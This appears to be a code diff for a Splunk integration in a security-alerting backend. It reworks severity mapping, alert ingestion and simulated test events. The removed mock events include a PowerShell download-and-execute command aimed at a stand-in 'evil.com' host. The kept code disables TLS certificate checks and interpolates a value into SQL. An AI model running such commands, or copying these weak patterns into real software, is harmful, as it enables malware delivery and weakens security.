@@ -1,4 +1,4 @@
-import axios, { AxiosInstance } from 'axios';
+﻿import axios, { AxiosInstance } from 'axios';
 import https from 'https';
 import { env } from '../../config/env';
 import { logger } from '../../config/logger';
@@ -25,11 +25,8 @@ export class SplunkService {
         'Authorization': authHeader,
         'Content-Type': 'application/x-www-form-urlencoded'
       },
-      // Disable SSL verification for local self-signed Splunk certs
-      httpsAgent: new https.Agent({
-        rejectUnauthorized: false
-      }),
-      timeout: 15000 // 15s timeout
+      httpsAgent: new https.Agent({ rejectUnauthorized: false }),
+      timeout: 15000
     });
   }
 
@@ -50,7 +47,6 @@ export class SplunkService {
     const earliest = options?.earliestTime || '-24h';
     const latest = options?.latestTime || 'now';
 
-    // Construct form body
     const params = new URLSearchParams();
     params.append('search', queryText);
     params.append('exec_mode', 'oneshot');
@@ -70,23 +66,14 @@ export class SplunkService {
       const results = response.data.results || [];
       const mappedEvents: SplunkEvent[] = results.map((row: any) => this.mapRowToSplunkEvent(row));
 
-      return {
-        results: mappedEvents,
-        count: mappedEvents.length,
-        offset
-      };
+      return { results: mappedEvents, count: mappedEvents.length, offset };
     } catch (error: any) {
       logger.error({ error: error.message, status: error.response?.status }, 'splunk: search execution failed');
       
-      // Fallback to simulate events if simulation mode is enabled
       if (env.SPLUNK_SIMULATION_MODE) {
-        logger.warn('splunk: connection failed, falling back to simulated events (SPLUNK_SIMULATION_MODE is true)');
+        logger.warn('splunk: connection failed, falling back to simulated events');
         const simulated = this.generateSimulatedEvents(queryText, limit, offset);
-        return {
-          results: simulated,
-          count: simulated.length,
-          offset
-        };
+        return { results: simulated, count: simulated.length, offset };
       }
       
       throw error;
@@ -114,33 +101,109 @@ export class SplunkService {
   }
 
   /**
-   * Ingests Splunk security events into the local Alerts module database
+   * Ingests Splunk security events into PostgreSQL alerts.
+   * Correct severity mapping per SOC requirements:
+   *   4625 -> high, 4740 -> critical, 4672 -> medium, 4688 -> medium
+   * Also triggers MITRE mapping and email alerts.
    */
-  async ingestEventsAsAlerts(events: SplunkEvent[]): Promise<void> {
+  async ingestEventsAsAlerts(events: SplunkEvent[]): Promise<{ processed: number; created: number; skipped: number }> {
     logger.info({ count: events.length }, 'splunk: ingesting events as alerts');
+    let created = 0;
+    let skipped = 0;
+
     for (const event of events) {
       try {
         const severity = this.mapEventCodeToSeverity(event.eventCode);
+        const externalId = event.fields._cd || `splunk-${event.time}-${event.host}-${event.eventCode}`;
+        
         const alertDto: CreateAlertDto = {
           title: `Splunk: ${event.eventCodeDescription}`,
           description: `Event Code ${event.eventCode} detected on host ${event.host}. Source: ${event.source}`,
           severity,
           status: 'new',
           source: 'splunk',
-          externalId: event.fields._cd || `splunk-${event.time}-${event.host}-${event.eventCode}`,
+          externalId,
           sourceRuleId: event.eventCode,
           sourceRuleName: event.eventCodeDescription,
-          rawEvent: event.fields,
+          rawEvent: { ...event.fields, host: event.host, srcIp: event.srcIp },
           tags: ['splunk', `event-${event.eventCode}`, event.sourcetype],
           firedAt: event.time
         };
-        await this.alertService.createAlert(alertDto);
+
+        const alert = await this.alertService.createAlert(alertDto);
+        
+        // Check if newly created (not returned from cache = duplicate)
+        const alertCreatedAt = new Date(alert.createdAt).getTime();
+        const isNew = (Date.now() - alertCreatedAt) < 5000;
+        
+        if (isNew) {
+          created++;
+          
+          // Auto-assign MITRE technique
+          try {
+            const { MitreService } = await import('../mitre/mitre.service');
+            const mitreService = new MitreService();
+            await mitreService.assignTechnique(alert.id, event.eventCode);
+          } catch (mitreErr: any) {
+            logger.debug({ err: mitreErr.message }, 'splunk: MITRE assignment skipped');
+          }
+
+          // Send email for critical/high events
+          try {
+            const { EmailService } = await import('../email/email.service');
+            const emailService = new EmailService();
+            const emailPayload = {
+              id: alert.id,
+              title: alert.title,
+              severity: alert.severity,
+              source: alert.source,
+              description: alert.description,
+              sourceRuleId: alert.sourceRuleId,
+              host: event.host,
+              srcIp: event.srcIp,
+              firedAt: alert.firedAt,
+              riskScore: alert.riskScore
+            };
+            
+            if (event.eventCode === '4740') {
+              await emailService.sendAccountLockout(emailPayload);
+            } else if (event.eventCode === '4625' && severity === 'high') {
+              await emailService.sendBruteForceAlert(emailPayload);
+            } else if (severity === 'critical') {
+              await emailService.sendCriticalAlert(emailPayload);
+            }
+          } catch (emailErr: any) {
+            logger.debug({ err: emailErr.message }, 'splunk: email notification skipped');
+          }
+
+          // Auto-trigger AI analysis for critical/high alerts
+          if (severity === 'critical' || severity === 'high') {
+            try {
+              const { AiService } = await import('../ai/ai.service');
+              const aiService = new AiService();
+              setImmediate(async () => {
+                try {
+                  await aiService.analyzeAlert(alert.id);
+                  logger.info({ alertId: alert.id }, 'splunk: AI analysis completed for high-severity alert');
+                } catch (aiErr: any) {
+                  logger.debug({ err: aiErr.message, alertId: alert.id }, 'splunk: AI analysis failed');
+                }
+              });
+            } catch (aiErr: any) {
+              logger.debug({ err: aiErr.message }, 'splunk: AI service import failed');
+            }
+          }
+        } else {
+          skipped++;
+        }
       } catch (err: any) {
-        // Skip duplicate unique constraint issues
-        if (err.code === '23505') continue;
-        logger.error({ err: err.message, event }, 'splunk: failed to ingest event as alert');
+        if (err.code === '23505') { skipped++; continue; }
+        logger.error({ err: err.message, eventCode: event.eventCode }, 'splunk: failed to ingest event as alert');
       }
     }
+
+    logger.info({ processed: events.length, created, skipped }, 'splunk: ingestion complete');
+    return { processed: events.length, created, skipped };
   }
 
   private mapRowToSplunkEvent(row: any): SplunkEvent {
@@ -164,23 +227,28 @@ export class SplunkService {
     };
   }
 
+  /**
+   * Severity mapping per SOC requirements:
+   * 4625 Failed Logon -> high
+   * 4740 Account Lockout -> critical
+   * 4672 Special Privileges -> medium
+   * 4688 Process Creation -> medium
+   * 4720 User Created -> high
+   * 4728 Group Member Added -> critical
+   * 7045 Service Installed -> critical
+   * 4624 Success Logon -> info
+   */
   private mapEventCodeToSeverity(code: string): 'info' | 'low' | 'medium' | 'high' | 'critical' {
     switch (code) {
-      case '4624': // Success logon
-      case '4688': // Process create
-        return 'info';
-      case '4625': // Failed logon
-        return 'low';
-      case '4672': // Special privilege
-      case '4740': // Account lockout
-        return 'medium';
-      case '4720': // User created
-        return 'high';
-      case '4728': // Group added
-      case '7045': // Service installed
-        return 'critical';
-      default:
-        return 'medium';
+      case '4624': return 'info';
+      case '4625': return 'high';
+      case '4672': return 'medium';
+      case '4688': return 'medium';
+      case '4740': return 'critical';
+      case '4720': return 'high';
+      case '4728': return 'critical';
+      case '7045': return 'critical';
+      default:     return 'medium';
     }
   }
 
@@ -188,74 +256,51 @@ export class SplunkService {
     const mockDb: SplunkEvent[] = [
       {
         time: new Date(Date.now() - 5 * 60000).toISOString(),
-        raw: "Security: An account failed to log on. TargetUserName: administrator. Status: 0xC000006D.",
-        host: "win-prod-dc01",
-        source: "WinEventLog:Security",
-        sourcetype: "WinEventLog:Security",
-        eventCode: "4625",
-        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4625"] || "An account failed to log on",
-        user: "administrator",
-        srcIp: "10.0.12.85",
-        fields: { EventCode: "4625", TargetUserName: "administrator", IpAddress: "10.0.12.85", host: "win-prod-dc01" }
+        raw: "Security: An account failed to log on. TargetUserName: administrator.",
+        host: "win-prod-dc01", source: "WinEventLog:Security", sourcetype: "WinEventLog:Security",
+        eventCode: "4625", eventCodeDescription: EVENT_ID_DESCRIPTIONS["4625"] || "An account failed to log on",
+        user: "administrator", srcIp: "10.0.12.85",
+        fields: { EventCode: "4625", TargetUserName: "administrator", IpAddress: "10.0.12.85", host: "win-prod-dc01", _cd: `sim-4625-${Date.now()}` }
       },
       {
         time: new Date(Date.now() - 15 * 60000).toISOString(),
-        raw: "Security: A member was added to a security-enabled global group. MemberName: CN=jdoe,OU=Users. GroupName: Domain Admins.",
-        host: "win-prod-dc01",
-        source: "WinEventLog:Security",
-        sourcetype: "WinEventLog:Security",
-        eventCode: "4728",
-        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4728"] || "A member was added to a security-enabled global group",
-        user: "jdoe",
-        fields: { EventCode: "4728", TargetUserName: "Domain Admins", MemberName: "jdoe", host: "win-prod-dc01" }
+        raw: "Security: A user account was locked out.",
+        host: "win-prod-dc01", source: "WinEventLog:Security", sourcetype: "WinEventLog:Security",
+        eventCode: "4740", eventCodeDescription: EVENT_ID_DESCRIPTIONS["4740"] || "A user account was locked out",
+        user: "jdoe", srcIp: "10.0.5.55",
+        fields: { EventCode: "4740", TargetUserName: "jdoe", host: "win-prod-dc01", _cd: `sim-4740-${Date.now()}` }
       },
       {
         time: new Date(Date.now() - 30 * 60000).toISOString(),
-        raw: "Security: A service was installed in the system. Service Name: PwDumpSvc. Service File Name: C:\\Windows\\Temp\\pwdump.exe",
-        host: "win-prod-srv02",
-        source: "WinEventLog:System",
-        sourcetype: "WinEventLog:System",
-        eventCode: "7045",
-        eventCodeDescription: EVENT_ID_DESCRIPTIONS["7045"] || "A service was installed in the system",
+        raw: "Security: Special privileges assigned to new logon.",
+        host: "win-prod-srv02", source: "WinEventLog:Security", sourcetype: "WinEventLog:Security",
+        eventCode: "4672", eventCodeDescription: EVENT_ID_DESCRIPTIONS["4672"] || "Special privileges assigned",
         user: "SYSTEM",
-        fields: { EventCode: "7045", ServiceName: "PwDumpSvc", ImagePath: "C:\\Windows\\Temp\\pwdump.exe", host: "win-prod-srv02" }
+        fields: { EventCode: "4672", host: "win-prod-srv02", _cd: `sim-4672-${Date.now()}` }
       },
       {
         time: new Date(Date.now() - 45 * 60000).toISOString(),
-        raw: "Security: A new process has been created. NewProcessName: C:\\Windows\\System32\\powershell.exe. CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')",
-        host: "win-workstation-05",
-        source: "WinEventLog:Security",
-        sourcetype: "WinEventLog:Security",
-        eventCode: "4688",
-        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4688"] || "A new process has been created",
-        user: "local_admin",
-        processName: "C:\\Windows\\System32\\powershell.exe",
-        commandLine: "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')",
-        fields: { EventCode: "4688", NewProcessName: "C:\\Windows\\System32\\powershell.exe", CommandLine: "powershell.exe ...", host: "win-workstation-05" }
+        raw: "Security: A new process has been created. NewProcessName: powershell.exe",
+        host: "win-workstation-05", source: "WinEventLog:Security", sourcetype: "WinEventLog:Security",
+        eventCode: "4688", eventCodeDescription: EVENT_ID_DESCRIPTIONS["4688"] || "A new process has been created",
+        user: "local_admin", processName: "powershell.exe",
+        fields: { EventCode: "4688", NewProcessName: "powershell.exe", host: "win-workstation-05", _cd: `sim-4688-${Date.now()}` }
       },
       {
         time: new Date(Date.now() - 60 * 60000).toISOString(),
-        raw: "Security: An account was successfully logged on. TargetUserName: system_admin.",
-        host: "win-prod-dc01",
-        source: "WinEventLog:Security",
-        sourcetype: "WinEventLog:Security",
-        eventCode: "4624",
-        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4624"] || "An account was successfully logged on",
-        user: "system_admin",
-        srcIp: "10.0.1.200",
-        fields: { EventCode: "4624", TargetUserName: "system_admin", IpAddress: "10.0.1.200", host: "win-prod-dc01" }
+        raw: "Security: An account was successfully logged on.",
+        host: "win-prod-dc01", source: "WinEventLog:Security", sourcetype: "WinEventLog:Security",
+        eventCode: "4624", eventCodeDescription: EVENT_ID_DESCRIPTIONS["4624"] || "An account was successfully logged on",
+        user: "system_admin", srcIp: "10.0.1.200",
+        fields: { EventCode: "4624", TargetUserName: "system_admin", IpAddress: "10.0.1.200", host: "win-prod-dc01", _cd: `sim-4624-${Date.now()}` }
       }
     ];
 
-    // Simple filtering based on query text
     let filtered = mockDb;
-    if (queryText.includes("4625")) {
-      filtered = mockDb.filter(e => e.eventCode === "4625");
-    } else if (queryText.includes("4688")) {
-      filtered = mockDb.filter(e => e.eventCode === "4688");
-    } else if (queryText.includes("4672") || queryText.includes("4728")) {
-      filtered = mockDb.filter(e => e.eventCode === "4672" || e.eventCode === "4728");
-    }
+    if (queryText.includes("4625")) filtered = mockDb.filter(e => e.eventCode === "4625");
+    else if (queryText.includes("4740")) filtered = mockDb.filter(e => e.eventCode === "4740");
+    else if (queryText.includes("4688")) filtered = mockDb.filter(e => e.eventCode === "4688");
+    else if (queryText.includes("4672")) filtered = mockDb.filter(e => e.eventCode === "4672");
 
     return filtered.slice(offset, offset + limit);
   }
@@ -280,10 +325,7 @@ export class SplunkService {
 
   async pruneOldAlerts(days = 30): Promise<number> {
     logger.info({ days }, 'splunk: pruning old alerts from database');
-    const deleteSql = `
-      DELETE FROM alerts
-      WHERE fired_at < now() - interval '${days} days'
-    `;
+    const deleteSql = `DELETE FROM alerts WHERE fired_at < now() - interval '${days} days'`;
     const { query } = await import('../../config/database');
     const res = await query(deleteSql);
     return res.rowCount || 0;
